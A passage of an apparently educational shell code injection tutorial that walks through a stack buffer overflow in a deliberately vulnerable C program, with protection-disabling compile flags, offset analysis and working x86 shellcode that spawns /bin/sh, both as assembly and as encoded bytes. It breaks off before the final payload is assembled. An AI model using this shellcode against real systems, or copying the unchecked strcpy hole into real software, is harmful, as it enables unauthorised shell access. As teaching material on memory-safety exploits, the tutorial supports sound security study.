# Shell Code Injection Demo


## Prerequisites: {#prerequisites}

Refer to this [https://pdfhost.io/v/8DZuyTT8v_Vulnerable_Program_and_Attack.pdf]

## Scenario & Setting Up {#scenario-and-setting-up}

Exploit a system to gain **shell access**.

Our `inj.c`:

```c
#include <stdio.h>
#include <string.h>

void func(char *name)
{
    char buf[100];
    strcpy(buf, name);
    printf("Welcome %s\n", buf);
}

int main(int argc, char *argv[])
{
    func(argv[1]);
    return 0;
}
```

**Note:** we need to compile it with

```bash
gcc inj.c -o inj -fno-stack-protector -z execstack -m32 -mpreferred-stack-boundary=2
```


## Shell Code Injection {#shell-code-injection}


### Analysis {#analysis}

Clearly, there is a vulnerability in `inj.c`. The `strcpy` doesn't
specify a maximum length while copying, _which will cause
**segmentation fualt**_.

Let's disassemble the program:

```bash
objdump -d -M intel inj
```

\href{https://pastebin.com/YihwwsvD}{Full output}

From `<func>`, we see the 7-th line,
`80483b1:   8d 45 9c                lea    eax,[ebp-0x64]`

we can say that buffer takes `64` bytes, which is \\(6\*16 + 4 = 100\\)
bytes in decemal. The next 4 bytes is %ebp and the next will be our
\*target\*(_4 bytes_).


### Preparation of Shell Code {#preparation-of-shell-code}

Our Shell Code:

```nasm
xor     eax, eax    ;Clearing eax register
push    eax         ;Pushing NULL bytes
push    0x68732f2f  ;Pushing //sh
push    0x6e69622f  ;Pushing /bin
mov     ebx, esp    ;ebx now has address of /bin//sh
push    eax         ;Pushing NULL byte
mov     edx, esp    ;edx now has address of NULL byte
push    ebx         ;Pushing address of /bin//sh
mov     ecx, esp    ;ecx now has address of address
                    ;of /bin//sh byte
mov     al, 11      ;syscall number of execve is 11
int     0x80        ;Make the system call
```

Use `nasm -f elf shellcode.asm` to compile it.

Convert the shellcode to
`\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80`

(_this should be same even for different envs_).


### Find a possible place to inject shellcode {#find-a-possible-place-to-inject-shellcode}

In the example, `buf` is a perfect target because we can modify it as
we like. How do we know what address `buf` will be loaded in stack?

Use **GDB**: `gdb -q inj` to find the address of the buffer.


### Then follow the same rule to compose the injection w

